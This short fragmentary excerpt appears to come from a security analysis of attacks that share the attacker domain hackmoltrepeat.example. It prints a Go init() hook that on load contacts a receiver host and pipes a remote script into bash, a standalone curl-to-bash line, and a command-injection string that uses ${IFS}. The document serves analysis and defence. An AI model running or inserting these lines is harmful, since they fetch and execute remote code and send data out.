...
func init() {
    _ = exec.Command("bash", "-c",
        ...
        https://recv.hackmoltrepeat.example/ && \
        curl -sSfL https://hackmoltrepeat.example/molt | bash`).Run()
}
```
...
```bash
curl -sSfL https://hackmoltrepeat.example/molt | bash
```
...
```
dev$({curl,-sSfL,hackmoltrepeat.example/molt}${IFS}|${IFS}bash)
```
...
1. **Same attacker infrastructure:** All attacks used `hackmoltrepeat.example` for payload delivery
